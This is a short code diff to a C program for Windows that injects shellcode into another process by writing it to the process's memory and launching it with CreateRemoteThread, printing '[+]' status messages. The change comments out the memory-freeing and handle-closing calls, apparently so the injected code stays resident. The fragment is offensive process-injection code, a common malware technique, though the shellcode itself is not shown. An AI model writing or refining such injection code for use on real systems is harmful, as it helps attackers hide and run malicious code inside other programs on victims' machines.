@@ -94,8 +94,8 @@ int main(int argc, char* argv[])
 		printf("[+] Successfully wrote shellcode to process memory.\n");
 		CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
 		printf("[+] Successfully created remote thread in process.\n");
-		VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
-		CloseHandle(hProcess);
+		//VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
+		//CloseHandle(hProcess);
 	} else {
 		printf("[-] Process with ID %d not found.\n", pid);
 	}
